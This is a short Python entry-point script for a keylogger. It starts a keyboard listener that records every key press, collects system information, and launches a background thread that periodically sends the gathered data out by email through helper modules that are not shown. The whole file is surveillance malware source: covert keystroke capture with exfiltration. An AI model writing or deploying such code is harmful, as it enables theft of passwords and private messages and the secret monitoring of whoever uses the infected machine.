#Main keylogger

#Import Modules
import threading
from pynput import keyboard
from key_logger import Keypress
from comp_info import system_information
from email_handler import periodic_email, send_email

#Main function (Used to listen)        
if __name__ == "__main__":
    listner = keyboard.Listener(on_press=Keypress)
    listner.start()
    system_information()
    email_thread = threading.Thread(target=periodic_email, daemon=True)
    email_thread.start()
    input()

